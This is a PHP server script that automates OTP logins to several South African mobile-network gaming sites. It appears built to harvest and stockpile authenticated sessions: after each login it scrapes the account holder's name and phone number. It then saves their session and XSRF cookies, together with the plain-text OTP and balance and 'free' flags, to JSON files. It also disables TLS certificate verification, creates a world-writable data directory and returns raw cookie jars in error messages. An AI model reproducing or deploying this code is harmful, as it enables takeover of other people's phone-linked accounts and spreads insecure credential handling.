<?php
session_start();
header('Content-Type: application/json');

// Require login (adjust if your app uses a different session key)
if (empty($_SESSION['user'])) {
  http_response_code(401);
  echo json_encode(['error'=>true,'message'=>'Not authenticated']); exit;
}

// Directories / files
$dataDir = __DIR__ . '/data';
if (!is_dir($dataDir)) { @mkdir($dataDir, 0777, true); }

// ---- Config ----
$MOBILE_UA = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36';

// ---- Helpers ----
function normalize_msisdn($input){
  $digits = preg_replace('/\D+/', '', $input ?? '');
  if (preg_match('/^0\d{9}$/', $digits)) return substr($digits, 1); // drop leading 0
  if (preg_match('/^27\d{9}$/', $digits)) return substr($digits, 2); // drop leading 27
  return null;
}
function get_between($s,$start,$end){
  $p = explode($start, $s, 2);
  if (count($p) < 2) return '';
  $p2 = explode($end, $p[1], 2);
  return $p2[0];
}
function parse_cookiejar($path){
  $out = [];
  if (!file_exists($path)) return $out;
  $fh = fopen($path, 'r');
  if (!$fh) return $out;
  while (($ln = fgets($fh)) !== false){
    $ln = rtrim($ln, "\r\n");
    if ($ln === '') continue;
    if (strpos($ln, '#HttpOnly_') === 0) { $ln = substr($ln, 1); }
    elseif ($ln[0] === '#') { continue; }
    // Netscape cookie file is TAB-separated: domain, flag, path, secure, expiry, name, value
    $cols = explode("\t", $ln);
    if (count($cols) < 7) { $cols = preg_split('/\s+/', $ln); }
    if (count($cols) >= 7){
      $name = $cols[count($cols)-2];
      $value = $cols[count($cols)-1];
      $out[$name] = $value;
    }
  }
  fclose($fh);
  return $out;
}
function loadCookies($file){
  if (!file_exists($file)) return [];
  $raw = file_get_contents($file);
  $arr = json_decode($raw, true);
  return is_array($arr) ? $arr : [];
}
function saveCookies($file, $arr){
  file_put_contents($file, json_encode($arr, JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES));
}
function fetchInfo($cookie, $base, $ua){
  $url = rtrim($base, '/') . '/my-winnings?display=tab3';
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
  curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Cookie: ' . $cookie,
    'User-Agent: ' . $ua,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language: en-US,en;q=0.9',
    'Upgrade-Insecure-Requests: 1',
  ]);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  $html = curl_exec($ch);
  curl_close($ch);

  $dom = new DOMDocument();
  @$dom->loadHTML($html);
  $xp = new DOMXPath($dom);

  $phoneNode = $xp->query("//span[contains(@class,'phone-cont')]");
  $phone = $phoneNode->length > 0 ? trim($phoneNode->item(0)->nodeValue) : '';

  $nameNode = $xp->query("//div[contains(@class,'user-name-new')]//h6");
  $name = $nameNode->length > 0 ? trim($nameNode->item(0)->nodeValue) : '';

  return ['name'=>$name, 'phone'=>$phone];
}

// ---- Input ----
$input = json_decode(file_get_contents('php://input'), true);
if (!is_array($input)) $input = [];
$action   = $input['action']   ?? null;
$provider = $input['provider'] ?? '';
$phoneIn  = $input['phone']    ?? '';
$otp      = $input['otp']      ?? '';

// ---- Provider → base URL map ----
$map = [
  'mtn'  => 'https://www.yellorush.co.za',
  'voda' => 'https://gameplay.mzansigames.club',
  'mtn2' => 'https://rush-games-telkom.yellorush.co.za',
];
if (!isset($map[$provider])) {
  echo json_encode(['error'=>true,'message'=>'Unknown provider']); exit;
}
$base = $map[$provider];

// Per-provider storage file
$fileMap = [
  'mtn'  => $dataDir . '/cookies-mtn.json',
  'voda' => $dataDir . '/cookies.json',
  'mtn2' => $dataDir . '/cookies-mtn2.json',
];
$storeFile = $fileMap[$provider];
if (!file_exists($storeFile)) { file_put_contents($storeFile, json_encode([], JSON_PRETTY_PRINT)); }

$cookieFile = __DIR__ . '/useless/otp_cookie_' . session_id() . '_' . bin2hex(random_bytes(4)) . '.txt';
@unlink($cookieFile);

// ---- Actions ----
if ($action === 'send') {
  $core = normalize_msisdn($phoneIn);
  if ($core === null) {
    echo json_encode(['error'=>true,'message'=>'Invalid SA number. Use 0XXXXXXXXX or 27XXXXXXXXX.']); exit;
  }
  $msisdn = '0' . $core;

  // 1) GET login (CSRF)
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $base . '/login');
  curl_setopt($ch, CURLOPT_USERAGENT, $MOBILE_UA);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
  curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
  $html = curl_exec($ch);
  if (curl_errno($ch)) {
    $err = curl_error($ch); curl_close($ch);
    echo json_encode(['error'=>true,'message'=>'Token fetch error: '.$err]); exit;
  }
  curl_close($ch);
  $token = trim(strip_tags(get_between($html, 'name="_token" value="', '"')));
  if (!$token) {
    echo json_encode(['error'=>true,'message'=>'Could not get CSRF token']); exit;
  }

  // 2) POST login to send OTP
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $base . '/login');
  curl_setopt($ch, CURLOPT_USERAGENT, $MOBILE_UA);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
  curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '_token=' . urlencode($token) . '&email=' . urlencode($msisdn));
  curl_exec($ch);
  if (curl_errno($ch)) {
    $err = curl_error($ch); curl_close($ch);
    echo json_encode(['error'=>true,'message'=>'Send OTP error: '.$err]); exit;
  }
  curl_close($ch);

  echo json_encode(['error'=>false,'next'=>'otp','message'=>"OTP sent to {$msisdn}",'parsed'=>$core,'provider'=>$provider]); exit;
}

if ($action === 'verify') {
  $core = $input['parsed'] ?? '';
  if (!preg_match('/^\d{9}$/', $core)) {
    echo json_encode(['error'=>true,'message'=>'Missing/invalid parsed msisdn']); exit;
  }
  $msisdn27 = '27' . $core;

  // 1) GET login (CSRF)
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $base . '/login');
  curl_setopt($ch, CURLOPT_USERAGENT, $MOBILE_UA);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
  curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
  $html = curl_exec($ch);
  if (curl_errno($ch)) {
    $err = curl_error($ch); curl_close($ch);
    echo json_encode(['error'=>true,'message'=>'Token fetch error: '.$err]); exit;
  }
  curl_close($ch);
  $token = trim(strip_tags(get_between($html, 'name="_token" value="', '"')));
  if (!$token) {
    echo json_encode(['error'=>true,'message'=>'Could not get CSRF token']); exit;
  }

  // 2) POST OTP
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $base . '/submitotp');
  curl_setopt($ch, CURLOPT_USERAGENT, $MOBILE_UA);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
  curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
  curl_setopt($ch, CURLOPT_POSTFIELDS,
    '_token=' . urlencode($token) .
    '&email=' . urlencode($msisdn27) .
    '&password=' . urlencode($otp)
  );
  curl_exec($ch);
  if (curl_errno($ch)) {
    $err = curl_error($ch); curl_close($ch);
    echo json_encode(['error'=>true,'message'=>'Verify OTP error: '.$err]); exit;
  }
  curl_close($ch);

  // 3) GET play-now to confirm session
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $base . '/play-now');
  curl_setopt($ch, CURLOPT_USERAGENT, $MOBILE_UA);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
  curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
  curl_exec($ch);
  $redirectedUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
  curl_close($ch);

  // Extract cookies from jar
  $rawJar = @file_get_contents($cookieFile) ?: '';
  @file_put_contents($dataDir . '/last_cookiejar.txt', $rawJar);
  $jar = parse_cookiejar($cookieFile);
  $xsrf = null; $sessionName = null; $sessionVal = null;
  foreach ($jar as $k=>$v){
    if ($xsrf === null && stripos($k, 'xsrf') !== false) { $xsrf = $v; }
    if ($sessionVal === null && stripos($k, 'session') !== false) { $sessionName=$k; $sessionVal=$v; }
  }
  if (!$xsrf || !$sessionVal){
    @unlink($cookieFile);
    echo json_encode(['error'=>true,'message'=>'Could not extract session/XSRF cookies','jar_keys'=>array_keys($jar),'raw'=>substr($rawJar,0,4000)]); exit;
  }
  $cookieStr = "XSRF-TOKEN={$xsrf};{$sessionName}={$sessionVal}";

  // Attach profile info
  $info = fetchInfo($cookieStr, $base, $MOBILE_UA);
  if (!$info['name'] || !$info['phone']){
    @unlink($cookieFile);
    echo json_encode(['error'=>true,'message'=>'Login ok but could not read profile (name/phone)']); exit;
  }

  // Save to store file (avoid duplicates by cookie OR phone in same domain)
  $list = loadCookies($storeFile);
  $domain = parse_url($base, PHP_URL_HOST);
  $dup = false;
  foreach ($list as $row){
    if (($row['domain'] ?? '') === $domain){
      if (($row['cookie'] ?? '') === $cookieStr || ($row['phone'] ?? '') === $info['phone']) {
        $dup = true; break;
      }
    }
  }
  if (!$dup){
    @unlink($cookieFile);
    $network = ($provider==='mtn' ? 'MTN' : ($provider==='voda' ? 'Vodacom' : 'Telkom-MTN70'));
    $list[] = [
      'id' => bin2hex(random_bytes(6)),
      'network' => $network,
      'domain' => $domain,
      'label' => $info['name'],
      'cookie' => $cookieStr,
      'phone' => $info['phone'],
      'name'  => $info['name'],
      'OTP' => $otp ?? null,
      'balance' => null,
      'isFree' => true,
      'created_at' => date('c'),
    ];
    saveCookies($storeFile, $list);
  }

  @unlink($cookieFile);
  echo json_encode([
    'error'=>false,
    'next'=>'done',
    'message'=> $dup ? 'Cookie/number already exists for this domain' : 'Cookie saved',
    'url'=>$redirectedUrl,
    'cookie'=>$cookieStr,
    'name'=>$info['name'],
    'phone'=>$info['phone'],
    'domain'=>$domain
  ]); exit;
}

// Bad request fallback
echo json_encode(['error'=>true,'message'=>'Bad request']);
?>
